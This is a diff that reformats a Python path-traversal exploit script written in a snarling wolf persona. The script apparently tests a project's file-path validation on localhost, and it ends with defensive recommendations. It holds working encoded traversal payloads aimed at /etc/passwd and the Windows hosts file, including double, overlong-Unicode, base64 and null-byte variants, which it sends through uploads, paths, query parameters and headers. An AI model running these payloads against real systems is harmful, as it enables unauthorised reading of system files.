@@ -8,262 +8,291 @@ double encoding, and Unicode tricks will bypass your weak validation!
 system files using encoded path traversal payloads.
 """
 
-import urllib.parse
-import requests
 import base64
-from typing import List, Dict, Optional
+import urllib.parse
 from dataclasses import dataclass
+
+import requests
 from rich.console import Console
-from rich.table import Table
 from rich.panel import Panel
+from rich.table import Table
 
 console = Console()
+
 
 @dataclass
 class TraversalPayload:
     """Path traversal payload with encoding"""
+
     name: str
     payload: str
     encoding: str
     description: str
     expected_result: str
 
+
 class EncodedPathTraversalExploit:
     """
     *circles with menacing intent* Exploits path traversal with encoded payloads
-    
+
     VULNERABILITY: packages/file-processing/src/processing-pipeline.ts:293
     if (file.includes("..") || file.includes("~") || file.startsWith("/")) {
         return { isValid: false, error: "Invalid file path" };
     }
-    
+
     This simple check can be bypassed with encoding!
     """
-    
+
     def __init__(self, base_url: str = "http://localhost:8000"):
         self.base_url = base_url
         self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': '🐺 BlackHat Exploit Suite',
-            'Content-Type': 'application/json'
-        })
-        
+        self.session.headers.update(
+            {
+                "User-Agent": "🐺 BlackHat Exploit Suite",
+                "Content-Type": "application/json",
+            }
+        )
+
         # *packs hunting formation* Generate encoded traversal payloads
         self.payloads = self._generate_traversal_payloads()
-    
-    def run_exploit(self) -> List[Dict]:
+
+    def run_exploit(self) -> list[dict]:
         """
         *snarls with predatory glee* Execute encoded path traversal attacks
         """
-        console.print(Panel.fit(
-            "[bold red]🐺 ENCODED PATH TRAVERSAL EXPLOIT[/bold red]\n"
-            "*bares fangs with savage satisfaction* Bypassing your weak path validation!",
-            border_style="red"
-        ))
-        
+        console.print(
+            Panel.fit(
+                "[bold red]🐺 ENCODED PATH TRAVERSAL EXPLOIT[/bold red]\n"
+                "*bares fangs with savage satisfaction* Bypassing your weak path validation!",
+                border_style="red",
+            )
+        )
+
         results = []
-        
+
         # Test each payload type
         for payload in self.payloads:
             console.print(f"\n[bold yellow]🎯 Testing:[/bold yellow] {payload.name}")
             console.print(f"[dim]Payload:[/dim] {payload.payload}")
             console.print(f"[dim]Encoding:[/dim] {payload.encoding}")
-            
+
             result = self._test_payload(payload)
             results.append(result)
-            
-            if result['success']:
-                console.print(f"[red]✗[/red] VULNERABILITY CONFIRMED: {result['description']}")
+
+            if result["success"]:
+                console.print(
+                    f"[red]✗[/red] VULNERABILITY CONFIRMED: {result['description']}"
+                )
             else:
                 console.print(f"[green]✓[/green] Blocked: {result['description']}")
-        
+
         return results
-    
-    def _generate_traversal_payloads(self) -> List[TraversalPayload]:
+
+    def _generate_traversal_payloads(self) -> list[TraversalPayload]:
         """
         *growls with menacing intent* Generate various encoded traversal payloads
         """
         payloads = []
-        
+
         # Basic URL encoding
-        payloads.append(TraversalPayload(
-            name="URL Encoded Basic",
-            payload=urllib.parse.quote("../etc/passwd"),
-            encoding="URL Encoding",
-            description="Basic URL-encoded path traversal",
-            expected_result="Access to /etc/passwd"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="URL Encoded Basic",
+                payload=urllib.parse.quote("../etc/passwd"),
+                encoding="URL Encoding",
+                description="Basic URL-encoded path traversal",
+                expected_result="Access to /etc/passwd",
+            )
+        )
+
         # Double URL encoding
-        payloads.append(TraversalPayload(
-            name="Double URL Encoded",
-            payload=urllib.parse.quote(urllib.parse.quote("../etc/passwd")),
-            encoding="Double URL Encoding",
-            description="Double-encoded path traversal",
-            expected_result="Access to /etc/passwd"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Double URL Encoded",
+                payload=urllib.parse.quote(urllib.parse.quote("../etc/passwd")),
+                encoding="Double URL Encoding",
+                description="Double-encoded path traversal",
+                expected_result="Access to /etc/passwd",
+            )
+        )
+
         # Mixed encoding
-        payloads.append(TraversalPayload(
-            name="Mixed Encoding",
-            payload="%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
-            encoding="Mixed URL Encoding",
-            description="Mixed character encoding",
-            expected_result="Access to /etc/passwd"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Mixed Encoding",
+                payload="%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
+                encoding="Mixed URL Encoding",
+                description="Mixed character encoding",
+                expected_result="Access to /etc/passwd",
+            )
+        )
+
         # Unicode encoding
-        payloads.append(TraversalPayload(
-            name="Unicode Encoded",
-            payload="%c0%ae%c0%ae%c0%af%65%74%63%c0%af%70%61%73%73%77%64",
-            encoding="Unicode Encoding",
-            description="Unicode-encoded path traversal",
-            expected_result="Access to /etc/passwd"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Unicode Encoded",
+                payload="%c0%ae%c0%ae%c0%af%65%74%63%c0%af%70%61%73%73%77%64",
+                encoding="Unicode Encoding",
+                description="Unicode-encoded path traversal",
+                expected_result="Access to /etc/passwd",
+            )
+        )
+
         # Base64 encoding
-        payloads.append(TraversalPayload(
-            name="Base64 Encoded",
-            payload=base64.b64encode(b"../etc/passwd").decode(),
-            encoding="Base64 Encoding",
-            description="Base64-encoded path traversal",
-            expected_result="Access to /etc/passwd"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Base64 Encoded",
+                payload=base64.b64encode(b"../etc/passwd").decode(),
+                encoding="Base64 Encoding",
+                description="Base64-encoded path traversal",
+                expected_result="Access to /etc/passwd",
+            )
+        )
+
         # Windows path separators
-        payloads.append(TraversalPayload(
-            name="Windows Path",
-            payload="..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            encoding="Windows Path",
-            description="Windows-style path traversal",
-            expected_result="Access to Windows hosts file"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Windows Path",
+                payload="..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                encoding="Windows Path",
+                description="Windows-style path traversal",
+                expected_result="Access to Windows hosts file",
+            )
+        )
+
         # URL-encoded Windows path
-        payloads.append(TraversalPayload(
-            name="URL Encoded Windows",
-            payload=urllib.parse.quote("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"),
-            encoding="URL Encoded Windows",
-            description="URL-encoded Windows path traversal",
-            expected_result="Access to Windows hosts file"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="URL Encoded Windows",
+                payload=urllib.parse.quote(
+                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+                ),
+                encoding="URL Encoded Windows",
+                description="URL-encoded Windows path traversal",
+                expected_result="Access to Windows hosts file",
+            )
+        )
+
         # Null byte injection
-        payloads.append(TraversalPayload(
-            name="Null Byte Injection",
-            payload="../etc/passwd%00.jpg",
-            encoding="Null Byte",
-            description="Null byte injection to bypass extension checks",
-            expected_result="Access to /etc/passwd despite .jpg extension"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Null Byte Injection",
+                payload="../etc/passwd%00.jpg",
+                encoding="Null Byte",
+                description="Null byte injection to bypass extension checks",
+                expected_result="Access to /etc/passwd despite .jpg extension",
+            )
+        )
+
         # Long path traversal
-        payloads.append(TraversalPayload(
-            name="Long Path Traversal",
-            payload="../../../../../../../../../../../../../../../../etc/passwd",
-            encoding="Long Path",
-            description="Excessive path traversal",
-            expected_result="Access to /etc/passwd"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Long Path Traversal",
+                payload="../../../../../../../../../../../../../../../../etc/passwd",
+                encoding="Long Path",
+                description="Excessive path traversal",
+                expected_result="Access to /etc/passwd",
+            )
+        )
+
         # Mixed separators
-        payloads.append(TraversalPayload(
-            name="Mixed Separators",
-            payload="../..\\../..\\../etc/passwd",
-            encoding="Mixed Separators",
-            description="Mixed Unix/Windows path separators",
-            expected_result="Access to /etc/passwd"
-        ))
-        
+        payloads.append(
+            TraversalPayload(
+                name="Mixed Separators",
+                payload="../..\\../..\\../etc/passwd",
+                encoding="Mixed Separators",
+                description="Mixed Unix/Windows path separators",
+                expected_result="Access to /etc/passwd",
+            )
+        )
+
         return payloads
-    
-    def _test_payload(self, payload: TraversalPayload) -> Dict:
+
+    def _test_payload(self, payload: TraversalPayload) -> dict:
         """
         *bares fangs* Test a specific traversal payload
         """
         try:
             # Test 1: File upload with malicious filename
             result1 = self._test_file_upload_traversal(payload)
-            
+
             # Test 2: Path parameter injection
             result2 = self._test_path_parameter_traversal(payload)
-            
+
             # Test 3: Query parameter injection
             result3 = self._test_query_parameter_traversal(payload)
-            
+
             # Test 4: Header injection
             result4 = self._test_header_traversal(payload)
-            
+
             # Combine results
-            success_count = sum([r['success'] for r in [result1, result2, result3, result4]])
-            
+            success_count = sum(
+                [r["success"] for r in [result1, result2, result3, result4]]
+            )
+
             return {
-                'payload': payload,
-                'success': success_count > 0,
-                'success_count': success_count,
-                'total_tests': 4,
-                'description': f"{payload.description} - {success_count}/4 vectors successful",
-                'details': {
-                    'file_upload': result1,
-                    'path_parameter': result2,
-                    'query_parameter': result3,
-                    'header_injection': result4
-                }
+                "payload": payload,
+                "success": success_count > 0,
+                "success_count": success_count,
+                "total_tests": 4,
+                "description": f"{payload.description} - {success_count}/4 vectors successful",
+                "details": {
+                    "file_upload": result1,
+                    "path_parameter": result2,
+                    "query_parameter": result3,
+                    "header_injection": result4,
+                },
             }
-            
+
         except Exception as e:
             return {
-                'payload': payload,
-                'success': False,
-                'success_count': 0,
-                'total_tests': 4,
-                'description': f"Test failed: {str(e)}",
-                'details': {}
+                "payload": payload,
+                "success": False,
+                "success_count": 0,
+                "total_tests": 4,
+                "description": f"Test failed: {e!s}",
+                "details": {},
             }
-    
-    def _test_file_upload_traversal(self, payload: TraversalPayload) -> Dict:
+
+    def _test_file_upload_traversal(self, payload: TraversalPayload) -> dict:
         """
         *snarls with predatory glee* Test file upload with malicious filename
         """
         try:
             # Create a fake file with malicious name
-            files = {
-                'file': (payload.payload, b'fake content', 'text/plain')
-            }
-            
+            files = {"file": (payload.payload, b"fake content", "text/plain")}
+
             response = self.session.post(
-                f"{self.base_url}/api/upload",
-                files=files,
-                timeout=5
+                f"{self.base_url}/api/upload", files=files, timeout=5
             )
-            
+
             # Check if the malicious path was processed
             if response.status_code == 200:
                 response_data = response.json()
-                if 'path' in response_data and '..' in response_data['path']:
+                if "path" in response_data and ".." in response_data["path"]:
                     return {
-                        'success': True,
-                        'method': 'File Upload',
-                        'description': 'Malicious filename accepted',
-                        'response': response_data
+                        "success": True,
+                        "method": "File Upload",
+                        "description": "Malicious filename accepted",
+                        "response": response_data,
                     }
-            
+
             return {
-                'success': False,
-                'method': 'File Upload',
-                'description': 'Malicious filename blocked',
-                'response': response.text[:200]
+                "success": False,
+                "method": "File Upload",
+                "description": "Malicious filename blocked",
+                "response": response.text[:200],
             }
-            
+
         except Exception as e:
             return {
-                'success': False,
-                'method': 'File Upload',
-                'description': f'Request failed: {str(e)}',
-                'response': None
+                "success": False,
+                "method": "File Upload",
+                "description": f"Request failed: {e!s}",
+                "response": None,
             }
-    
-    def _test_path_parameter_traversal(self, payload: TraversalPayload) -> Dict:
+
+    def _test_path_parameter_traversal(self, payload: TraversalPayload) -> dict:
         """
         *growls with menacing intent* Test path parameter injection
         """
@@ -273,199 +302,221 @@ class EncodedPathTraversalExploit:
                 f"/api/files/{payload.payload}",
                 f"/api/download/{payload.payload}",
                 f"/api/read/{payload.payload}",
-                f"/api/caption/generate?image_path={payload.payload}"
+                f"/api/caption/generate?image_path={payload.payload}",
             ]
-            
+
             for endpoint in endpoints:
                 try:
-                    response = self.session.get(
-                        f"{self.base_url}{endpoint}",
-                        timeout=5
-                    )
-                    
+                    response = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
+
                     # Check for successful traversal
                     if response.status_code == 200:
-                        response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
-                        
+                        response_data = (
+                            response.json()
+                            if response.headers.get("content-type", "").startswith(
+                                "application/json"
+                            )
+                            else response.text
+                        )
+
                         # Look for signs of successful traversal
-                        if any(indicator in str(response_data).lower() for indicator in ['root:', 'passwd', 'system32', 'hosts']):
+                        if any(
+                            indicator in str(response_data).lower()
+                            for indicator in ["root:", "passwd", "system32", "hosts"]
+                        ):
                             return {
-                                'success': True,
-                                'method': 'Path Parameter',
-                                'description': f'Traversal successful via {endpoint}',
-                                'response': str(response_data)[:200]
+                                "success": True,
+                                "method": "Path Parameter",
+                                "description": f"Traversal successful via {endpoint}",
+                                "response": str(response_data)[:200],
                             }
-                            
+
                 except Exception:
                     continue
-            
+
             return {
-                'success': False,
-                'method': 'Path Parameter',
-                'description': 'All path parameter attempts blocked',
-                'response': None
+                "success": False,
+                "method": "Path Parameter",
+                "description": "All path parameter attempts blocked",
+                "response": None,
             }
-            
+
         except Exception as e:
             return {
-                'success': False,
-                'method': 'Path Parameter',
-                'description': f'Test failed: {str(e)}',
-                'response': None
+                "success": False,
+                "method": "Path Parameter",
+                "description": f"Test failed: {e!s}",
+                "response": None,
             }
-    
-    def _test_query_parameter_traversal(self, payload: TraversalPayload) -> Dict:
+
+    def _test_query_parameter_traversal(self, payload: TraversalPayload) -> dict:
         """
         *bares teeth with savage satisfaction* Test query parameter injection
         """
         try:
             # Test various query parameters
             params = {
-                'path': payload.payload,
-                'file': payload.payload,
-                'filename': payload.payload,
-                'image_path': payload.payload,
-                'target': payload.payload
+                "path": payload.payload,
+                "file": payload.payload,
+                "filename": payload.payload,
+                "image_path": payload.payload,
+                "target": payload.payload,
             }
-            
+
             for param_name, param_value in params.items():
                 try:
                     response = self.session.get(
                         f"{self.base_url}/api/files",
                         params={param_name: param_value},
-                        timeout=5
+                        timeout=5,
                     )
-                    
+
                     if response.status_code == 200:
-                        response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
-                        
+                        response_data = (
+                            response.json()
+                            if response.headers.get("content-type", "").startswith(
+                                "application/json"
+                            )
+                            else response.text
+                        )
+
                         # Check for successful traversal
-                        if any(indicator in str(response_data).lower() for indicator in ['root:', 'passwd', 'system32', 'hosts']):
+                        if any(
+                            indicator in str(response_data).lower()
+                            for indicator in ["root:", "passwd", "system32", "hosts"]
+                        ):
                             return {
-                                'success': True,
-                                'method': 'Query Parameter',
-                                'description': f'Traversal successful via {param_name} parameter',
-                                'response': str(response_data)[:200]
+                                "success": True,
+                                "method": "Query Parameter",
+                                "description": f"Traversal successful via {param_name} parameter",
+                                "response": str(response_data)[:200],
                             }
-                            
+
                 except Exception:
                     continue
-            
+
             return {
-                'success': False,
-                'method': 'Query Parameter',
-                'description': 'All query parameter attempts blocked',
-                'response': None
+                "success": False,
+                "method": "Query Parameter",
+                "description": "All query parameter attempts blocked",
+                "response": None,
             }
-            
+
         except Exception as e:
             return {
-                'success': False,
-                'method': 'Query Parameter',
-                'description': f'Test failed: {str(e)}',
-                'response': None
+                "success": False,
+                "method": "Query Parameter",
+                "description": f"Test failed: {e!s}",
+                "response": None,
             }
-    
-    def _test_header_traversal(self, payload: TraversalPayload) -> Dict:
+
+    def _test_header_traversal(self, payload: TraversalPayload) -> dict:
         """
         *circles with menacing intent* Test header injection
         """
         try:
             # Test various headers that might accept file paths
             headers = {
-                'X-File-Path': payload.payload,
-                'X-Target-Path': payload.payload,
-                'X-Source-Path': payload.payload,
-                'X-Download-Path': payload.payload
+                "X-File-Path": payload.payload,
+                "X-Target-Path": payload.payload,
+                "X-Source-Path": payload.payload,
+                "X-Download-Path": payload.payload,
             }
-            
+
             for header_name, header_value in headers.items():
                 try:
                     test_headers = self.session.headers.copy()
                     test_headers[header_name] = header_value
-                    
+
                     response = self.session.get(
-                        f"{self.base_url}/api/files",
-                        headers=test_headers,
-                        timeout=5
+                        f"{self.base_url}/api/files", headers=test_headers, timeout=5
                     )
-                    
+
                     if response.status_code == 200:
-                        response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
-                        
+                        response_data = (
+                            response.json()
+                            if response.headers.get("content-type", "").startswith(
+                                "application/json"
+                            )
+                            else response.text
+                        )
+
                         # Check for successful traversal
-                        if any(indicator in str(response_data).lower() for indicator in ['root:', 'passwd', 'system32', 'hosts']):
+                        if any(
+                            indicator in str(response_data).lower()
+                            for indicator in ["root:", "passwd", "system32", "hosts"]
+                        ):
                             return {
-                                'success': True,
-                                'method': 'Header Injection',
-                                'description': f'Traversal successful via {header_name} header',
-                                'response': str(response_data)[:200]
+                                "success": True,
+                                "method": "Header Injection",
+                                "description": f"Traversal successful via {header_name} header",
+                                "response": str(response_data)[:200],
                             }
-                            
+
                 except Exception:
                     continue
-            
+
             return {
-                'success': False,
-                'method': 'Header Injection',
-                'description': 'All header injection attempts blocked',
-                'response': None
+                "success": False,
+                "method": "Header Injection",
+                "description": "All header injection attempts blocked",
+                "response": None,
             }
-            
+
         except Exception as e:
             return {
-                'success': False,
-                'method': 'Header Injection',
-                'description': f'Test failed: {str(e)}',
-                'response': None
+                "success": False,
+                "method": "Header Injection",
+                "description": f"Test failed: {e!s}",
+                "response": None,
             }
+
 
 def main():
     """
     *howls with purpose* Main execution function
     """
-    console.print(Panel.fit(
-        "[bold red]🐺 ENCODED PATH TRAVERSAL EXPLOIT[/bold red]\n"
-        "*snarls with predatory glee* Bypassing your weak path validation!",
-        border_style="red"
-    ))
-    
+    console.print(
+        Panel.fit(
+            "[bold red]🐺 ENCODED PATH TRAVERSAL EXPLOIT[/bold red]\n"
+            "*snarls with predatory glee* Bypassing your weak path validation!",
+            border_style="red",
+        )
+    )
+
     # Run the exploit
     exploit = EncodedPathTraversalExploit()
     results = exploit.run_exploit()
-    
+
     # Display results
     console.print("\n[bold red]🎯 EXPLOIT RESULTS[/bold red]")
-    
+
     table = Table(title="Path Traversal Vulnerability Analysis")
     table.add_column("Payload Type", style="cyan")
     table.add_column("Success", style="green")
     table.add_column("Success Rate", style="yellow")
     table.add_column("Description", style="white")
-    
+
     for result in results:
-        success_icon = "✓" if result['success'] else "✗"
+        success_icon = "✓" if result["success"] else "✗"
         success_rate = f"{result['success_count']}/{result['total_tests']}"
-        
+
         table.add_row(
-            result['payload'].name,
-            success_icon,
-            success_rate,
-            result['description']
+            result["payload"].name, success_icon, success_rate, result["description"]
         )
-    
+
     console.print(table)
-    
+
     # Show successful exploits
-    successful_exploits = [r for r in results if r['success']]
+    successful_exploits = [r for r in results if r["success"]]
     if successful_exploits:
         console.print("\n[bold red]🚨 SUCCESSFUL EXPLOITS[/bold red]")
         for result in successful_exploits:
             console.print(f"\n[bold]{result['payload'].name}:[/bold]")
-            for method, details in result['details'].items():
-                if details.get('success'):
+            for method, details in result["details"].items():
+                if details.get("success"):
                     console.print(f"  • {details['method']}: {details['description']}")
-    
+
     # Show recommendations
     console.print("\n[bold red]🛡️ DEFENSIVE RECOMMENDATIONS[/bold red]")
     recommendations = [
@@ -476,18 +527,21 @@ def main():
         "Use proper file system APIs that prevent traversal",
         "Add logging for suspicious path access attempts",
         "Implement file type validation beyond extension checking",
-        "Use content-based file validation"
+        "Use content-based file validation",
     ]
-    
+
     for rec in recommendations:
         console.print(f"  • {rec}")
-    
-    console.print(Panel.fit(
-        "[bold red]*snarls with predatory satisfaction*[/bold red]\n"
-        "Your path validation has been torn apart!\n"
-        "Time to implement proper path security, pup! 🐺",
-        border_style="red"
-    ))
+
+    console.print(
+        Panel.fit(
+            "[bold red]*snarls with predatory satisfaction*[/bold red]\n"
+            "Your path validation has been torn apart!\n"
+            "Time to implement proper path security, pup! 🐺",
+            border_style="red",
+        )
+    )
+
 
 if __name__ == "__main__":
     main()
